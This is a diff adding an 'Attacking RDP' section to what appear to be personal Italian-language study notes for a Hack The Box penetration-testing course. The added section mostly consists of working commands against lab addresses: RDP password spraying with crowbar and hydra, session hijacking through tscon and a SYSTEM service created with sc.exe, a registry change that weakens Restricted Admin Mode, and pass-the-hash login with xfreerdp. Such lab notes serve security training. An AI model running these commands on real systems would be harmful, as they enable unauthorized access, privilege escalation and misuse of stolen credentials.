@@ -461,3 +461,62 @@ Possiamo usare lo statement **EXECUTE** per eseguire comandi sul linked server
 DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
 
 ```
+
+# Attacking RDP
+
+### Enum
+`j4k1dibe@htb[/htb]# nmap -Pn -p3389 192.168.2.143 `
+
+## Misconfiguration
+
+Un metodo semplice **Password guessing**., a volte potremmo pure trovare un RDP senza password
+
+Usando **crowbar (https://github.com/galkan/crowbar)** possiamo fare password spraying su RDP
+
+### PAssword spray con crowbar
+`j4k1dibe@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
+
+### Password spray con Hydra
+`j4k1dibe@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`
+
+### RDP Login
+`j4k1dibe@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143`
+
+`xfreerdp /v:host /u:username`
+
+## Protocol specific attacks
+## RDP Session Hijacking
+
+Se un utente e' connesso via RDP ad una macchina compromessa da noi possiamo hijackare la sessione dell' utente per scalare privilegi e impersonare l'account.
+
+Per impersonare un utente senza la loro password dovremo avere privilegi SYSTEM e usare **tscon.exe** per abilitare utenti a connettersi ad una altra sessione di Desktop.
+
+`C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`
+
+Se siamo local admin ci sono molti modi per escalare tpo con con PsExec o Mimikatz. Un trucco semplice e' creare un servizio che runna come local system
+
+```
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+```
+
+cosi' spawna un nuovo terminale
+
+
+### RDP Pass the hash
+Possiamo voler avere accesso ad applicazioni o software installati che si possono usare solo con GUI.
+
+**Restriced Admin Mode**. che e' disabilitata da default dovremmo abilitarla senno' ci da' un errore in login ovvero che non gli abbiamo dato password perche' noi passiamo hash, non password. Per disabilitarla bastera' aggiungere una Reg key.
+
+`C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+
+`j4k1dibe@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9` Login with Pass the Hash.
+
+
